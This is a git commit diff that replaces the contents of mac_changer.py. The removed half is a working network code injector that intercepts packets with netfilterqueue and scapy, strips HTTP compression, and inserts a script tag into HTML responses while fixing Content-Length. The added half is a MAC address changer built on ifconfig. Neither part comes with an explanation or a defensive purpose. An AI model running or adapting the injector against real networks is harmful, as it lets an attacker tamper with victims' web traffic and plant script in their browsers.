12cc288f116288f96a1e4f14a64d97ceb8eeb188
SharmaJi-Codes <72036588+SharmaJi-Codes@users.noreply.github.com>
2020-09-30 22:02:46 +0530

    Update mac_changer.py

--- mac_changer.py
+++ mac_changer.py
@@ -1,40 +1,40 @@
 #!/usr/bin/env python3
-import netfilterqueue
-import scapy.all as scapy
+
+import subprocess
+import optparse
 import re
 
-def set_load(packet, load):
-    packet[scapy.Raw].load = load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-    return packet
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-i", "--interface", dest="interface", help="Use to specify the interface whose MAC address is to be changed.")
+    parser.add_option("-m", "--mac", dest="new_mac", help="Use to specify new MAC address.")
+    (options, arguments) = parser.parse_args()
+    if not options.interface:
+        parser.error("[-] Please specify an interface, use --help for more information.")
+    elif not options.new_mac:
+        parser.error("[-] Please specify a new MAC address, use --help for more information.")
+    return options
 
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        try:
-            load = scapy_packet[scapy.Raw].load.decode()
-            if scapy_packet[scapy.TCP].dport == 80:
-                print("[+] Request")
-                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-            elif scapy_packet[scapy.TCP].sport == 80:
-                print("[+] Response")
-                #print(scapy_packet.show())
-                injection_code = "<script>alert('test');</script>"
-                load = load.replace("</body>", injection_code+"</body>")
-                content_length_search =re.search("(?:Content-Length:\s)(\d*)", load)
-                if content_length_search and "text/html" in load:
-                    content_length = content_length_search.group(1)
-                    new_content_length = int(content_length) + len(injection_code)
-                    load = load.replace(content_length, str(new_content_length))
-            if load != scapy_packet[scapy.Raw].load:
-                new_packet = set_load(scapy_packet, load)
-                packet.set_payload(bytes(new_packet))
-        except UnicodeDecodeError:
-            pass
-    packet.accept()
+def change_mac(interface, new_mac):
+    print("[+] Changing MAC address for "+interface+" to "+new_mac)
+    subprocess.call(["ifconfig", interface, "down"])
+    subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
+    subprocess.call(["ifconfig", interface, "up"])
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+def get_current_mac(interface):
+    ifconfig_result = subprocess.check_output(["ifconfig", interface])
+    mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
+    if mac_address_search_result:
+        return mac_address_search_result.group(0)
+    else:
+        print("[-] Could not read MAC address.")
+
+options = get_arguments()
+current_mac = get_current_mac(options.interface)
+print("Current MAC = "+str(current_mac))
+change_mac(options.interface, options.new_mac)
+current_mac = get_current_mac(options.interface)
+if current_mac == options.new_mac:
+    print("[+] MAC address was successfully changed to "+current_mac)
+else:
+    print("[-] Unable to change MAC address.")
